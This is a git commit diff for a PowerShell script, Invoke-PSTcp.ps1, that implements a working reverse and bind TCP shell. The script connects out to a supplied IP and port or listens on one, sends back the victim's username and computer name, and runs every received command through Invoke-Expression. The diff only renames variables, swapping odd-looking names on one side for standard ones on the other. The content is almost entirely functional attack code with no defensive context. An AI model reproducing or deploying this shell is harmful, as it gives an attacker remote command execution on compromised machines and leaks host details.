7957324f59f44cd102716269d16cd7dad59551db
pattersonbr <pattersonbr@comcast.net>
2018-06-14 09:55:54 -0400

    Add files via upload

--- Invoke-PSTcp.ps1
+++ Invoke-PSTcp.ps1
@@ -1,24 +1,25 @@
 function Invoke-PSTcp 
-{       
-    [CmdletBinding(DefaultParameterSetName="rev")] Param(
+{ 
+      
+    [CmdletBinding(DefaultParameterSetName="reverse")] Param(
 
-        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="rev")]
+        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
         [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
         [String]
-        $IPAddr,
+        $IPAddress,
 
-        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="rev")]
+        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
         [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
         [Int]
-        $Pt,
+        $Port,
 
-        [Parameter(ParameterSetName="rev")]
+        [Parameter(ParameterSetName="reverse")]
         [Switch]
-        $Rev,
+        $Reverse,
 
         [Parameter(ParameterSetName="bind")]
         [Switch]
-        $Binding
+        $Bind
 
     )
 
@@ -26,58 +27,58 @@ function Invoke-PSTcp
     try 
     {
         
-        if ($Rev)
+        if ($Reverse)
         {
-            $clients = New-Object System.Net.Sockets.TCPClient($IPAddr,$Pt)
+            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
         }
 
         
-        if ($Binding)
+        if ($Bind)
         {
-            $listen = [System.Net.Sockets.TcpListener]$Pt
-            $listen.start()    
-            $clients = $listen.AcceptTcpClient()
+            $listener = [System.Net.Sockets.TcpListener]$Port
+            $listener.start()    
+            $client = $listener.AcceptTcpClient()
         } 
 
-        $river = $clients.GetStream()
+        $stream = $client.GetStream()
         [byte[]]$bytes = 0..65535|%{0}
 
         
-        $sendbits = ([text.encoding]::ASCII).GetBytes("User " + $env:username + " Workstation: " + $env:computername`n`n")
-        $river.Write($sendbits,0,$sendbits.Length)
+        $sendbytes = ([text.encoding]::ASCII).GetBytes("User " + $env:username + " Workstation " + $env:computername + "`n")
+        $stream.Write($sendbytes,0,$sendbytes.Length)
 
         
-        $sendbits = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
-        $river.Write($sendbits,0,$sendbits.Length)
+        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
+        $stream.Write($sendbytes,0,$sendbytes.Length)
 
-        while(($i = $river.Read($bytes, 0, $bytes.Length)) -ne 0)
+        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
         {
-            $EncdedTxt = New-Object -TypeName System.Text.ASCIIEncoding
-            $datamine = $EncdedTxt.GetString($bytes,0, $i)
+            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
+            $data = $EncodedText.GetString($bytes,0, $i)
             try
             {
                 
-                $send = (Invoke-Expression -Command $datamine 2>&1 | Out-String )
+                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
             }
             catch
             {
-                Write-Warning "Something went wrong" 
+                Write-Warning "Something went wrong!" 
                 Write-Error $_
             }
-            $send2  = $send + 'PS ' + (Get-Location).Path + '> '
+            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
             $x = ($error[0] | Out-String)
             $error.clear()
-            $send2 = $send2 + $x
+            $sendback2 = $sendback2 + $x
 
             
-            $sendbyte = ([text.encoding]::ASCII).GetBytes($send2)
-            $river.Write($sendbyte,0,$sendbyte.Length)
-            $river.Flush()  
+            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+            $stream.Write($sendbyte,0,$sendbyte.Length)
+            $stream.Flush()  
         }
-        $clients.Close()
-        if ($listen)
+        $client.Close()
+        if ($listener)
         {
-            $listen.Stop()
+            $listener.Stop()
         }
     }
     catch
